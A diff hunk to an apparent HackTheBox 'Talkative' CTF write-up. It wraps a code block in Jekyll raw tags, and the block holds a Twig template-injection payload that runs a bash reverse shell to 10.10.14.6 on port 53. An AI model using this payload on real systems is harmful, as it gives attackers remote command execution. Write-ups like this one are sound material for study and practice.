@@ -531,9 +531,11 @@ listening on [any] 53 ...
 
 - **Add the following RCE Twig template injection payload via editing the template:**
 
+{% raw %}
 ```twig
 {{['bash -c "bash -i >& /dev/tcp/10.10.14.6/53 0>&1"']|filter('system')}}
 ```
+{% endraw %}
 
 ![](https://raw.githubusercontent.com/siunam321/CTF-Writeups/main/HackTheBox/Talkative/images/Pasted%20image%2020230810174700.png)
 
